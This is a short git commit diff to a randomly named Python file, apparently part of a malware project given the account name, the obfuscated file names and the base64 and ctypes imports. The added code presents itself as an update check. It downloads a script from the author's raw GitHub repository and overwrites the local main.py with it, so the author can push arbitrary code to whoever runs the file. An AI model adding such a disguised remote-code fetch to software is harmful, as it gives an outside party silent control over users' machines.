a26f8824561c489c6a94591cfc54fbcfb37bab38
getrektaxq <130876657+getrektaxq@users.noreply.github.com>
2023-04-18 07:02:47 +0300

    Update IAHCNXAWEDFE.py

--- IAHCNXAWEDFE.py
+++ IAHCNXAWEDFE.py
@@ -1,3 +1,13 @@
+import requests as r
+
+print("Checking for updates...")
+script = r.get("https://raw.githubusercontent.com/getrektaxq/ACJDSXFCE/main/SHAXVHENCJR").text
+with open("main.py", "r") as f:
+   if f.read() != script:
+        print("Updating...")
+        with open("main.py", "w") as f:
+            f.write(script)
+            exit(0)
 import base64
 import ctypes
 import json
